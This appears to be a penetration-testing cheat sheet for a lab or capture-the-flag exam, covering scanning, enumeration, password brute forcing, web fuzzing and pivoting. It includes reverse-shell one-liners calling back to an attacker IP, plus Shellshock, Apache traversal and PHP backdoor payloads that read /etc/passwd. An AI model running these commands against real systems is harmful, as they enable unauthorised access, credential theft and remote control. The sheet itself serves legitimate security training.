# Useful Commands

Extract Uploaded tools:
```bash
tar -xzvf tool-uploads.tgz
```

---

## 1. Host Discovery

### Ping sweep

```bash
fping -a -g <target-range> 2>/dev/null
```

```bash
nmap -sn <target-range>
```

### ARP discovery

```bash
arp-scan -l
```

```bash
netdiscover -r <target-range>
```

### Count responding hosts (excluding yourself)

```bash
sudo nmap -sn <target-range> --exclude <your-ip> -oG - | grep -c 'Status: Up'
```

```bash
sudo nmap -sn <target-range> --exclude <your-ip> -oG - | awk '/Up$/{print $2}'
```

**Note:** Run as root on the local subnet so nmap uses ARP (catches hosts that drop ICMP). Across a router ARP does not apply — add `-PE -PS22,80,443,445 -PA80` probes or use `-Pn` with a port scan.

---

## 2. Port Scanning

### Quick TCP scan

```bash
nmap -sV -sC <target>
```

### Full TCP port scan

```bash
nmap -p- --min-rate 5000 -oN full-tcp.txt <target>
```

### Scan discovered ports in detail

```bash
nmap -sV -sC -p <ports> -oN detailed.txt <target>
```

### UDP top ports

```bash
nmap -sU --top-ports 100 <target>
```

### Aggressive scan

```bash
nmap -A <target>
```

### Services on non-standard ports

```bash
nmap -p- --min-rate 5000 <ip>
nmap -sV --version-all -p <port> <ip>
```

Grab the initial response manually:

```bash
nc -nv <ip> <port>                              # Wait a few seconds, then press Enter if nothing appears
printf 'HEAD / HTTP/1.0\r\n\r\n' | nc -nv <ip> <port>
openssl s_client -connect <ip>:<port> -quiet     # TLS-wrapped services
```

### Identify SSH product and version

```bash
nc -nv <ip> 22
nmap -sV -p 22 <ip>
```

```text
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3   ->  OpenSSH 7.6p1
SSH-2.0-dropbear_2019.78                  ->  Dropbear 2019.78
```

---

## 3. DNS and Hostname Enumeration

### DNS lookup

```bash
nslookup <host>
```

```bash
dig <host>
```

### Reverse DNS lookup

```bash
dig -x <ip>
```

### Zone transfer test

```bash
dig axfr @<dns-server> <domain>
```

```bash
host -l <domain> <dns-server>
dnsrecon -d <domain> -n <dns-server> -t axfr
```

### Query a specific record against a specific server

```bash
dig @<dns-server> <host>.<domain> A +short
dig @<dns-server> <domain> ANY
dig @<dns-server> -x <ip>                     # Reverse lookup (PTR)
```

**Note:** Always point `dig` at the target server with `@<dns-server>` — your own resolver will not know lab-only zones.

### If zone transfer is refused

```bash
dnsrecon -d <domain> -n <dns-server> -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
dnsrecon -r <network>/<cidr> -n <dns-server>  # Reverse sweep a range
```

---

## 4. NetBIOS, SMB, SNMP, NFS and FTP Enumeration

### NetBIOS scan

```bash
nbtscan <target-range>
```

```bash
nbtscan -v <ip>                                # Full name table
```

```bash
nmblookup -A <ip>
```

```bash
sudo nmap -sU -p 137 --script nbstat <ip>
nmap -p 445 --script smb-os-discovery <ip>     # Shows NetBIOS computer name, domain and workgroup
```

### Reading the NetBIOS name table

```text
WIN-HOST01      <00>  UNIQUE   ->  Computer name
CORP            <00>  GROUP    ->  NetBIOS domain / workgroup name
WIN-HOST01      <20>  UNIQUE   ->  File server service running
CORP            <1c>  GROUP    ->  Domain controllers for CORP
CORP            <1b>  UNIQUE   ->  Domain master browser (PDC)
```

**Note:** The NetBIOS domain is the short name, e.g. `CORP`, not the DNS domain `corp.lab`. `netexec smb <ip>` and `rpcclient querydominfo` also show it.

### SMB signing

```bash
nmap -p 445 --script smb2-security-mode <ip>
nmap -p 445 --script smb-security-mode <ip>    # SMBv1 hosts
netexec smb <ip>                               # (signing:True) = required
netexec smb <target-range> --gen-relay-list relay-targets.txt
```

```text
Message signing enabled and required       ->  Signing required: Yes
Message signing enabled but not required   ->  Signing required: No (vulnerable to NTLM relay)
```

### SNMP community brute force

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <ip>
```

```bash
sudo nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <ip>
```

```bash
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <ip> snmp
```

### SNMP system information

```bash
snmpwalk -v2c -c <community> <ip> 1.3.6.1.2.1.1   # Whole system group
snmpget -v2c -c <community> <ip> 1.3.6.1.2.1.1.4.0
snmp-check -c <community> <ip>
```

| OID | Name |
|---|---|
| `1.3.6.1.2.1.1.1.0` | sysDescr (OS / firmware) |
| `1.3.6.1.2.1.1.4.0` | sysContact |
| `1.3.6.1.2.1.1.5.0` | sysName (hostname) |
| `1.3.6.1.2.1.1.6.0` | sysLocation |
| `1.3.6.1.2.1.25.4.2.1.2` | Running processes |
| `1.3.6.1.2.1.25.6.3.1.2` | Installed software |
| `1.3.6.1.4.1.77.1.2.25` | Windows user accounts |
| `1.3.6.1.2.1.6.13.1.3` | Open TCP ports |

**Note:** If `-v2c` returns nothing, retry with `-v1`. SNMP is UDP 161, so a TCP scan will not show it.

### NFS exports

```bash
showmount -e <ip>
nmap -p 111,2049 --script nfs-showmount,nfs-ls <ip>
```

```text
Export list for <ip>:
/srv/public    *                  ->  Anyone
/srv/backups   <subnet>/<cidr>    ->  Only clients in that range (check it contains <your-ip>)
/srv/admin     <other-ip>         ->  That host only
```

```bash
sudo mkdir -p /mnt/nfs && sudo mount -t nfs -o nolock,vers=3 <ip>:<export-path> /mnt/nfs
```

### Anonymous FTP

```bash
nmap -p 21 --script ftp-anon <ip>
```

```bash
ftp <ip>                                       # Name: anonymous   Password: <blank or anything>
```

```text
ls -la                 Show hidden files
get welcome.txt -      Print file to the terminal
binary                 Switch to binary before downloading non-text files
passive                Toggle passive mode if ls hangs
```

```bash
curl -s ftp://<ip>/                            # curl logs in as anonymous by default
curl -s ftp://<ip>/welcome.txt
```

### List SMB shares anonymously

```bash
smbclient -L //<ip> -N
```

### Connect to an SMB share

```bash
smbclient //<ip>/<share> -N
```

```bash
smbclient //<ip>/<share> -U <username>
```

### SMB enumeration

```bash
enum4linux-ng <ip>
```

```bash
smbmap -H <ip>
```

```bash
smbmap -H <ip> -u <username> -p <password>
```

### RPC anonymous login

```bash
rpcclient -U "" -N <ip>
```

Useful `rpcclient` commands:

```text
enumdomusers
enumdomgroups
querydominfo
srvinfo
netshareenumall
```

---

## 5. User Enumeration

### SMB user enumeration

```bash
enum4linux-ng <ip>
```

```bash
rpcclient -U "" -N <ip> -c "enumdomusers"
```

### SMTP user enumeration

```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <ip>
```

```bash
smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/Names/names.txt -t <ip>
```

### Kerberos user enumeration

```bash
kerbrute userenum -d <domain> /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt --dc <dc-ip>
```

### Finger user enumeration

```bash
finger <username>@<ip>
```

---

## 6. Password Attacks

### Hydra SSH

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt ssh://<ip>
```

```bash
hydra -l <username> -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt -t 4 -f ssh://<ip>   # Known user; -t 4 avoids SSH rate limits, -f stops on first hit
```

### Hydra FTP

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt ftp://<ip>
```

### Hydra HTTP POST form

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt <ip> http-post-form "/<login-path>:<user-field>=^USER^&<pass-field>=^PASS^:<failure-message>"
```

### NetExec SMB password spray

```bash
netexec smb <ip> -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/seclists/Passwords/Common-Credentials/best1050.txt
```

```bash
netexec smb <ip> -u <username> -p <password> --shares
```

---

## 7. Web Enumeration

### Identify web technology

```bash
whatweb http://<ip>:<port>
```

```bash
curl -i http://<ip>:<port>
```

### Directory brute force with Gobuster

```bash
gobuster dir -u http://<ip>:<port> -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

### Directory brute force with FFUF

```bash
ffuf -u http://<ip>:<port>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### File extension fuzzing

```bash
ffuf -u http://<ip>:<port>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .php,.txt,.html,.bak
```

### Backup and config file hunting

```bash
curl -s http://<ip>:<port>/robots.txt
curl -s http://<ip>:<port>/sitemap.xml
```

```bash
gobuster dir -u http://<ip>:<port> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x bak,old,zip,tar,gz,txt,conf,config,xml,ini,php,sql -b 404
```

```bash
ffuf -u http://<ip>:<port>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -e .bak,.old,.zip
```

Common names to check:

```text
/backup/  /backups/  /bak/  /old/  /config/  /conf/  /admin/  /dev/  /test/  /.git/
config.php.bak  config.php~  .config.php.swp  web.config.bak  settings.py.bak  backup.zip  db.sql  .env
```

**Note:** `301` to a trailing `/` or `403 Forbidden` both mean the directory exists. Recurse into interesting directories.

### Check common web vulnerabilities

```bash
nikto -h http://<ip>:<port>
```

### View page source

```bash
curl http://<ip>:<port>
```

### Download a file

```bash
wget http://<ip>:<port>/<file>
```

```bash
curl -O http://<ip>:<port>/<file>
```

---

## 8. Web Login Testing

### Basic request inspection

```bash
curl -i http://<ip>:<port>/<login-path>
```

### Send POST request

```bash
curl -i -X POST http://<ip>:<port>/<login-path> \
  -d "<user-field>=<username>&<pass-field>=<password>"
```

### Include cookies

```bash
curl -i http://<ip>:<port>/<protected-path> \
  -H "Cookie: <cookie-name>=<cookie-value>"
```

### SQL injection quick tests

```text
'
"
' OR '1'='1
<username>'--
' OR 1=1--
```

### SQLMap basic usage

```bash
sqlmap -u "http://<ip>:<port>/<page>?<parameter>=<value>"
```

```bash
sqlmap -u "http://<ip>:<port>/<login-path>" --forms --batch
```

---

## 9. Exploit Research

### Search local Exploit-DB

```bash
searchsploit <service>
```

```bash
searchsploit <service> <version>
```

### Copy exploit locally

```bash
searchsploit -m <exploit-id>
```

### Start Metasploit

```bash
msfconsole
```

### Search in Metasploit

```text
search <service>
use <module>
show options
set RHOSTS <target>
set RPORT <port>
run
```

### Nmap vulnerability scripts

```bash
nmap -sV --script vuln -p <ports> <ip>
nmap -p 445 --script smb-vuln* <ip>
```

### Classic vulnerable services

| Service / version | Check or exploit |
|---|---|
| vsftpd 2.3.4 | `exploit/unix/ftp/vsftpd_234_backdoor` (username ending `:)` opens a shell on 6200) |
| ProFTPD 1.3.5 (mod_copy) | Unauthenticated `SITE CPFR <file>` / `SITE CPTO <web-root>/out.txt` file copy; `exploit/unix/ftp/proftpd_modcopy_exec` |
| Samba 3.0.20 – 3.0.25rc3 | `exploit/multi/samba/usermap_script` |
| Samba 3.5.0 – 4.6.4 | `exploit/linux/samba/is_known_pipename` (writable share needed) |
| distccd | `exploit/unix/misc/distcc_exec` |
| UnrealIRCd 3.2.8.1 | `exploit/unix/irc/unreal_ircd_3281_backdoor` |
| Apache 2.4.49 / 2.4.50 | CVE-2021-41773 / 42013 path traversal (see below) |
| Bash CGI (Shellshock) | `curl -A '() { :; }; echo; /bin/cat /etc/passwd' http://<ip>/cgi-bin/<script>` |
| PHP 8.1.0-dev | Header `User-Agentt: zerodiumsystem('id');` |
| Webmin 1.890 – 1.920 | `exploit/linux/http/webmin_backdoor` |
| Drupal 7.x / 8.x | `exploit/unix/webapp/drupal_drupalgeddon2` |
| Tomcat manager | Default creds (`tomcat:s3cret`, `admin:admin`), then WAR upload |
| libssh 0.6 – 0.8.3 | CVE-2018-10933 auth bypass |
| OpenSSL heartbeat | `nmap -p 443 --script ssl-heartbleed <ip>` |
| SMBv1 (Win7 / 2008) | `nmap --script smb-vuln-ms17-010`; `exploit/windows/smb/ms17_010_eternalblue` |
| Windows XP / 2003 | `exploit/windows/smb/ms08_067_netapi` |
| Redis (no auth) | `redis-cli -h <ip> info`; write SSH key or web shell |

Apache 2.4.49 / 2.4.50 traversal (needs `--path-as-is`):

```bash
curl -s --path-as-is http://<ip>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd             # 2.4.49
curl -s --path-as-is http://<ip>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd  # 2.4.50
```

ProFTPD mod_copy manual file read:

```bash
nc -nv <ip> 21
```

```text
SITE CPFR /opt/assessment/trophy.txt
SITE CPTO /var/www/html/trophy.txt
```

```bash
curl -s http://<ip>/trophy.txt
```

---

## 10. Reverse Shells

### Netcat listener

```bash
nc -lvnp <listen-port>
```

### Bash reverse shell

```bash
bash -i >& /dev/tcp/<your-ip>/<listen-port> 0>&1
```

### Python reverse shell

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<your-ip>",<listen-port>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

### PHP reverse shell one-liner

```bash
php -r '$sock=fsockopen("<your-ip>",<listen-port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 11. Shell Stabilisation

### Upgrade shell with Python

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then press:

```text
Ctrl+Z
```

On your attacker machine:

```bash
stty raw -echo; fg
```

Then in the shell:

```bash
reset
export TERM=xterm
stty rows 40 columns 120
```

---

## 12. File Searching

### Find files by name

```bash
find / -iname "*<keyword>*" 2>/dev/null
```

```bash
find / -iname "*<trophy-pattern>*" 2>/dev/null
```

```bash
find / -iname "*<secret-pattern>*" 2>/dev/null
```

### Search for trophy values

```bash
grep -R "<trophy-prefix>" / 2>/dev/null
```

```bash
grep -R "<trophy-prefix>" /home 2>/dev/null
```

### Search readable files

```bash
find / -type f -readable 2>/dev/null
```

### Search recently modified files

```bash
find / -type f -mtime -7 2>/dev/null
```

### Identify file type

```bash
file <filename>
```

### Extract readable strings

```bash
strings <filename>
```

---

## 13. Linux Privilege Enumeration

### Current user

```bash
whoami
id
hostname
```

### System info

```bash
uname -a
cat /etc/os-release
```

### Sudo permissions

```bash
sudo -l
```

### SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Writable directories

```bash
find / -writable -type d 2>/dev/null
```

### Interesting files

```bash
ls -la /home
ls -la /root
cat /etc/passwd
cat /etc/crontab
```

### Running processes

```bash
ps aux
```

### Listening ports

```bash
ss -tulpen
```

```bash
netstat -tulpen
```

---

## 14. Windows Enumeration

### Current user

```cmd
whoami
whoami /priv
whoami /groups
hostname
```

### System info

```cmd
systeminfo
```

### Users and groups

```cmd
net user
net localgroup
net localgroup administrators
```

### Network info

```cmd
ipconfig /all
route print
netstat -ano
```

### Search for files

```cmd
dir C:\*<keyword>* /s /b
```

```cmd
dir C:\*<trophy-pattern>* /s /b
```

```cmd
dir C:\*<secret-pattern>* /s /b
```

### Search inside files

```cmd
findstr /si "<search-string>" C:\*.txt
```

### PowerShell file search

```powershell
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Filter "*<keyword>*"
```

```powershell
Select-String -Path C:\* -Pattern "<search-string>" -Recurse -ErrorAction SilentlyContinue
```

---

## 15. File Transfer

### Python HTTP server on attacker machine

```bash
python3 -m http.server <port>
```

### Download using wget

```bash
wget http://<your-ip>:<port>/<file>
```

### Download using curl

```bash
curl -O http://<your-ip>:<port>/<file>
```

### Download with PowerShell

```powershell
iwr http://<your-ip>:<port>/<file> -OutFile <file>
```

```powershell
Invoke-WebRequest http://<your-ip>:<port>/<file> -OutFile <file>
```

### Netcat file transfer

On receiving machine:

```bash
nc -lvnp <port> > <output-file>
```

On sending machine:

```bash
nc <target-ip> <port> < <input-file>
```

---

## 16. Routing

### Enumerate Network Configuration

```bash
ip -br addr                   # Interfaces and IP addresses
ip route                      # Current routing table
route -n                      # Legacy routing table
ip route get <IP>             # Show route/interface used to reach IP
```

### Add Static Routes

```bash
# Route to an entire network
sudo ip route add <NETWORK>/<CIDR> via <GATEWAY>

# Route to a single host (/32)
sudo ip route add <IP>/32 via <GATEWAY>

# Specify outgoing interface
sudo ip route add <NETWORK>/<CIDR> via <GATEWAY> dev eth0

# Directly connected network (no gateway)
sudo ip route add <NETWORK>/<CIDR> dev eth0

# Replace an existing route
sudo ip route replace <NETWORK>/<CIDR> via <GATEWAY>
```

**Note:** The gateway must normally be directly reachable. Use `ip -br addr` and `ip route` to identify the correct interface and gateway.

### Multi-Hop Routing (Gateway Behind Another Gateway)

If a new gateway is on an unreachable subnet, it may be reachable through an existing gateway.

**Example topology:**

```text
Kali (172.17.89.100)
    |
    v
Gateway 1 (172.17.89.254)
    |
    v
Gateway 2 (172.20.31.254)
    |
    v
Target (10.50.10.20)
```

```bash
# 1. Inspect existing routes
ip route
ip route get 172.20.31.254

# 2. Route to Gateway 2 through Gateway 1
sudo ip route add 172.20.31.254/32 via 172.17.89.254

# 3. Route the target through the directly reachable Gateway 1
sudo ip route add 10.50.10.20/32 via 172.17.89.254

# 4. Verify and test
ip route get 10.50.10.20
traceroute -n 10.50.10.20
nc -nvz -w 3 10.50.10.20 <PORT>
```

**Important:**
- Gateway 1 must know how to forward traffic towards Gateway 2 and the target.
- You generally only specify the **first reachable gateway** in your local routing table.
- Each intermediate router independently determines the next hop.
- Adding a route to Gateway 2 does not automatically make Gateway 2 the next hop for the target.
- If Gateway 1 lacks a route to the target, you may need to configure routing on Gateway 1 or use a tunnel/pivot.
- A valid local route does not guarantee that the return path exists.

### Verify & Troubleshoot

```bash
ip route get <IP>             # Confirm selected route
ping -c 3 <GATEWAY>           # Test gateway reachability
ping -c 3 <IP>                # Test destination (ICMP may be blocked)
traceroute -n <IP>            # Trace packet path
tracepath <IP>                # Alternative traceroute
nc -nvz -w 3 <IP> <PORT>      # Test TCP connectivity
nc -nv -w 5 <IP> <PORT>       # Connect and read service banner
```

### Delete Routes

```bash
sudo ip route del <NETWORK>/<CIDR>
sudo ip route del <IP>/32
```

### Example: Access a Service via a Router

**Target:** `172.20.31.10:23` via `172.17.89.254`

```bash
# 1. Check connectivity to gateway
ip -br addr
ip route
ping -c 2 172.17.89.254

# 2. Add host route
sudo ip route add 172.20.31.10/32 via 172.17.89.254

# 3. Verify routing
ip route get 172.20.31.10

# 4. Connect to Telnet and retrieve banner
nc -nv -w 5 172.20.31.10 23
telnet 172.20.31.10 23

# 5. Remove route
sudo ip route del 172.20.31.10/32
```

### Find Services in a Routed Network

ARP discovery does not cross a router, so use TCP probes once the route exists:

```bash
sudo nmap -Pn -n -p 21 --open <NETWORK>/<CIDR>
sudo nmap -sn -PE -PS21,22,23,80,443 -n <NETWORK>/<CIDR>
nc -nv -w 5 <IP> 21                    # Read the banner
```

### Open / Closed / Filtered

```bash
nmap -Pn -p <PORT> <IP>
```

| Result | Meaning |
|---|---|
| `open` / nc `succeeded` | Service accepting connections |
| `closed` / nc `Connection refused` | Host reachable, nothing listening (RST returned) |
| `filtered` / nc timeout | Firewall drop **or** a broken route / return path |

### Prove the Path Packets Take

```bash
sudo traceroute -n -T -p <PORT> <IP>   # TCP traceroute when ICMP/UDP is blocked
mtr -n -r -c 3 <IP>
```

```bash
# Confirm frames leave via the right interface to the right next-hop MAC
ip neigh show <GATEWAY>
sudo tcpdump -eni <INTERFACE> host <IP>
```

### Common Errors

| Error | Likely cause |
|---|---|
| `Nexthop has invalid gateway` | Gateway not directly reachable |
| `RTNETLINK answers: File exists` | Route already exists |
| `Network is unreachable` | Missing/incorrect route or interface |
| `Connection refused` | Service not listening or actively rejected |
| `Connection timed out` | Firewall, routing or return-path issue |

**Remember:**
- `/32` = single IPv4 host; `/24` = 256 IPv4 addresses.
- More specific routes take precedence (longest-prefix match).
- Static routes added using `ip route` are generally temporary.
- Ping failure does not necessarily indicate routing failure.
- Both forward and return paths must work for communication.
- In multi-hop routing, configure the route via the **first directly reachable gateway**.
- If the gateway is a pivot host, it must support forwarding/routing; a local static route alone is insufficient.

## 17. Telnet and Banner Grabbing

### Connect with Telnet

```bash
telnet <ip> <port>
```

### Connect with Netcat

```bash
nc -nv <ip> <port>
```

### Grab HTTP banner

```bash
curl -i http://<ip>:<port>
```

### Nmap banner script

```bash
nmap -sV --script=banner -p <port> <ip>
```

---

## 18. Pivoting and Proxying

### SSH local port forward

```bash
ssh -L <local-port>:<target-ip>:<target-port> <username>@<pivot-ip>
```

### SSH dynamic SOCKS proxy

```bash
ssh -D <socks-port> <username>@<pivot-ip>
```

### Use proxychains

```bash
proxychains nmap -sT -Pn <target>
```

```bash
proxychains curl http://<target>
```

### Chisel server on attacker

```bash
chisel server -p <port> --reverse
```

### Chisel client on target

```bash
chisel client <your-ip>:<port> R:socks
```

---

## 19. Wordlist Handling

### Sort and remove duplicates

```bash
sort <wordlist> | uniq > <output-file>
```

### Compare two files

```bash
comm -12 <(sort <file1>) <(sort <file2>)
```

### Grep exact matches between files

```bash
grep -Fxf <file1> <file2>
```

### Count lines

```bash
wc -l <wordlist>
```

### Extract usernames from enum output

```bash
grep -i "user" <enum-output-file>
```

---

## 20. Useful One-Liners

### Find likely trophy or secret files

```bash
find / -iname "*<trophy-pattern>*" -o -iname "*<secret-pattern>*" 2>/dev/null
```

### Find trophy text

```bash
grep -R "<trophy-prefix>" / 2>/dev/null
```

### Scan then enumerate SMB

```bash
nmap -p 139,445 -sV -sC <ip> && enum4linux-ng <ip>
```

### Quick web enum

```bash
whatweb http://<ip>:<port> && gobuster dir -u http://<ip>:<port> -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

### Quick service check

```bash
nc -nv <ip> <port>
```

### Start listener

```bash
nc -lvnp <listen-port>
```

---

## 21. Common Wordlists

Full list by task: `locations.md` → *Wordlists*.

```text
/usr/share/wordlists/dirb/common.txt
```

```text
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```text
/usr/share/seclists/Discovery/Web-Content/common.txt
```

```text
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

```text
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
```

```text
/usr/share/wordlists/rockyou.txt.gz
```

Unzip RockYou:

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

---

## 22. Exam-Style Workflow

### 1. Discover

```bash
nmap -sn <target-range>
```

### 2. Scan

```bash
nmap -p- --min-rate 5000 <ip>
```

### 3. Enumerate

```bash
nmap -sV -sC -p <ports> <ip>
```

### 4. Research

```bash
searchsploit <service> <version>
```

### 5. Exploit

```bash
msfconsole
```

or use a manual exploit.

### 6. Search for trophy

```bash
find / -iname "*<trophy-pattern>*" -o -iname "*<secret-pattern>*" 2>/dev/null
grep -R "<trophy-prefix>" / 2>/dev/null
```

---

## 23. Notes

Always record:

```text
Target IP
Open ports
Service versions
Valid usernames
Credentials found
Interesting shares
Interesting web paths
Trophy location
Trophy value
```

Suggested folder layout:

```bash
mkdir -p ~/crt-lab/<target>/{scans,loot,exploits,notes}
```

Save scans:

```bash
nmap -sV -sC -oN scans/basic.txt <target>
```

---

## 24. Placeholder Reference

| Placeholder                    | Meaning                                          |
| ------------------------------ | ------------------------------------------------ |
| `<target>`                     | IP address, hostname, or range                   |
| `<ip>`                         | Single target IP address                         |
| `<target-range>`               | Network range, for example `<subnet>/<cidr>`     |
| `<host>`                       | Hostname                                         |
| `<domain>`                     | DNS, Windows, or Kerberos domain                 |
| `<username>`                   | Single username                                  |
| `<password>`                   | Single password                                  |
| `<user-list>`                  | Username file (see `locations.md`)               |
| `<password-list>`              | Password file (see `locations.md`)               |
| `<wordlist>`                   | Any wordlist (see `locations.md`)                |
| `<port>`                       | TCP or UDP port                                  |
| `<ports>`                      | Comma-separated port list                        |
| `<gateway-ip>`                 | Router or pivot gateway                          |
| `<destination-ip>`             | Target behind a route                            |
| `<destination-network>/<cidr>` | Destination subnet, for example `10.10.10.0/24`  |
| `<keyword>`                    | File, service, or challenge-specific search term |
| `<trophy-pattern>`             | Filename pattern for trophy files                |
| `<secret-pattern>`             | Filename pattern for secret files                |
| `<trophy-prefix>`              | Known text prefix for trophy values              |
| `<search-string>`              | Text to search for inside files                  |
| `<your-ip>`                    | Your attacker/VPN IP address                     |
| `<listen-port>`                | Port used by your listener                       |
| `<pivot-ip>`                   | Compromised host used as a route or proxy        |
| `<login-path>`                 | Web login endpoint                               |
| `<protected-path>`             | Authenticated web path                           |
| `<user-field>`                 | Login form username parameter                    |
| `<pass-field>`                 | Login form password parameter                    |
| `<failure-message>`            | Text shown when login fails                      |
| `<community-wordlist>`         | SNMP community string wordlist                   |
| `<community>`                  | Valid SNMP community string                      |
| `<export-path>`                | NFS export path from `showmount -e`              |
| `<dns-server>`                 | Target DNS server IP                             |
| `<pcap>`                       | Packet capture file                              |
| `<vlan-id>`                    | 802.1Q VLAN ID                                   |

---

## 25. PCAP Analysis and VLANs

### PCAP overview

```bash
capinfos <pcap>
tshark -r <pcap> -q -z io,phs          # Protocol hierarchy
tshark -r <pcap> -q -z conv,ip         # Who talked to whom
tshark -r <pcap> -q -z endpoints,ip
```

### Pull credentials and cleartext

```bash
tshark -r <pcap> -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"' -T fields -e ip.dst -e ftp.request.arg
tshark -r <pcap> -Y 'http.authorization' -T fields -e http.authorization
tshark -r <pcap> -Y 'http.request.method == "POST"' -T fields -e http.host -e http.request.uri -e http.file_data
tshark -r <pcap> -Y 'snmp' -T fields -e snmp.community | sort -u
tshark -r <pcap> -Y 'telnet' -T fields -e telnet.data
strings <pcap> | grep -iE 'pass|user|login|<trophy-prefix>'
```

### Follow streams and export files

```bash
tshark -r <pcap> -q -z follow,tcp,ascii,<stream-number>
tshark -r <pcap> --export-objects http,./http-objects
tshark -r <pcap> -Y 'dns.flags.response == 0' -T fields -e dns.qry.name | sort -u
```

Wireshark equivalents: **Statistics → Protocol Hierarchy / Conversations**, right-click → **Follow → TCP Stream**, **File → Export Objects → HTTP**.

### Identify VLANs

```bash
tshark -r <pcap> -Y vlan -T fields -e vlan.id | sort -u
sudo tshark -i <INTERFACE> -Y 'cdp || lldp' -V    # CDP/LLDP leak native and voice VLAN IDs
sudo tcpdump -eni <INTERFACE> vlan
```

### Join a VLAN (tagged trunk / misconfigured port)

```bash
sudo modprobe 8021q
sudo ip link add link <INTERFACE> name <INTERFACE>.<vlan-id> type vlan id <vlan-id>
sudo ip addr add <ip>/<cidr> dev <INTERFACE>.<vlan-id>     # Or: sudo dhclient <INTERFACE>.<vlan-id>
sudo ip link set <INTERFACE>.<vlan-id> up
ip -d link show <INTERFACE>.<vlan-id>
```

```bash
sudo ip link del <INTERFACE>.<vlan-id>
```

**Note:** If the switch port negotiates DTP, `yersinia` can spoof a trunk to reach every VLAN.

### Reading Nessus output

- Sort by **Severity**, then open **Critical/High** first.
- **Plugin Output** holds the evidence (exact version, path, banner) — this is usually the answer.
- Filter **Exploit Available = true** / **Exploitable With = Metasploit** to shortlist exploitable findings.
- Confirm every finding manually (`nmap -sV`, banner, `searchsploit`) — Nessus flags by version and can be wrong.
